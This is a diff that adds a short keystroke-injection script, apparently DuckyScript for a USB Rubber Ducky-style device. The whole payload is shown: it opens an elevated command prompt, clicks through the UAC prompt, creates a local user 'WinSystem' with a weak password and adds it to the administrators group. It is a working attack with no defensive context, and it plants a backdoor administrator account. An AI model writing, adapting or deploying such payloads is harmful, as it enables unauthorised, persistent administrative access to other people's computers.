@@ -1,0 +1,17 @@
+GUI r
+DELAY 300
+STRING cmd
+DELAY 200
+CONTROL SHIFT ENTER
+DELAY 700
+LEFTARROW
+DELAY 300
+ENTER
+DELAY 700
+STRING net user WinSystem password /add
+DELAY 700
+ENTER
+DELAY 500
+STRING net localgroup administrators WinSystem /add
+DELAY 700
+ENTER
